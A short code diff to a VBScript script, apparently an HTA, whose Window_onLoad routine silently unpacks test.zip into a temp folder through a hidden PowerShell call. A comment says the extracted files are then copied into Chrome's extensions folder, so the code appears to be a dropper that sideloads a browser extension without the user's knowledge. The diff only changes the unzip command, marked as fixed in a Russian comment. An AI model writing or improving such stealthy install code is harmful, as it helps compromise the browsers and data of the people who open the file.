@@ -43,7 +43,8 @@ Sub Window_onLoad
             fso.CreateFolder(tempFolder & "\test")
         End If
         
-        unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
+        ' Исправленная команда распаковки
+        unzipCmd = "powershell -Command ""Expand-Archive -Path '" & tempFolder & "\test.zip' -DestinationPath '" & tempFolder & "\test' -Force"""
         shell.Run unzipCmd, 0, True
         
         ' Копируем файлы в папку расширений Chrome
